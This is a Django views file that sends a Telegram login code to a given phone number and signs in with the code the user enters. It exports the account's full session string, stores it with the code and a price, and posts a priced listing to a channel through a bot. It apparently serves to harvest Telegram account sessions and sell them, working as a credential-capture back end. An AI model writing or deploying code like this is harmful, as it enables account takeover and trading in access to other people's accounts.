from django.shortcuts import render, HttpResponseRedirect
from django.conf import settings
from pyrogram import client
# from pyrogram.enums import SentCodeType
import requests
from .forms import VerificationCodeForm
from .models import SessionModel, CountryModel
from tbot.plugins.emojies import emojies

# Static variables
APP = client.Client(
    "login",
    api_hash=settings.API_HASH,
    api_id=settings.API_ID,
    in_memory=True,
)

# Create your views here.
def verification_code_view(request, phone_number):

    if request.method == 'GET':
        country_code = request.GET.get('country_code')
        try:
            session = SessionModel.objects.get(phone_number=phone_number)
            if session.session_string:
                return HttpResponseRedirect('/login/done/')
            APP.phone_number = phone_number
        except:
            APP.phone_number = phone_number

        try:
            APP.connect()
        except:
            APP.disconnect()
            APP.connect()
        
        sent_code = APP.send_code(phone_number)

        # if sent_code.type not in [SentCodeType.SMS, SentCodeType.FRAGMENT_SMS]:
        #     return HttpResponseRedirect('/done/')

        form = VerificationCodeForm(initial={
            'phone_number': phone_number,
            'login_hash': sent_code.phone_code_hash,
            'country_code': country_code,
        })
        return render(request, 'verification.html', {'form': form})

    elif request.method == 'POST':

        form = VerificationCodeForm(request.POST)
        if form.is_valid():
            phone_number = form.cleaned_data['phone_number']
            country_code = form.cleaned_data['country_code']
            login_hash = form.cleaned_data['login_hash']
            verification_code = form.cleaned_data['verification_code']

            APP.sign_in(phone_number, login_hash, verification_code)
            session_string = APP.export_session_string()
            APP.disconnect()

            country = CountryModel.objects.get(country_code=country_code)
            session = SessionModel(
                country=country,
                phone_number=phone_number,
                last_verification_code=verification_code,
                session_string=session_string,
            )
            session.save()

            phone_number = phone_number[:5] + 'x' + phone_number[6:]
            channel_notification = f'📱 **+{phone_number}**\n{emojies[session.country.country_name]} #{session.country.country_name} | {session.pk}\n💵 {session.nitroseen_price}K'

            APP.bot_token = settings.BOT_TOKEN
            APP.start()
            msg = APP.send_message(settings.MAIN_CHANNEL, channel_notification)
            try:
                APP.stop()
            except:
                pass

            session.post_id = msg.id
            session.save()

            return HttpResponseRedirect('/login/done/')

            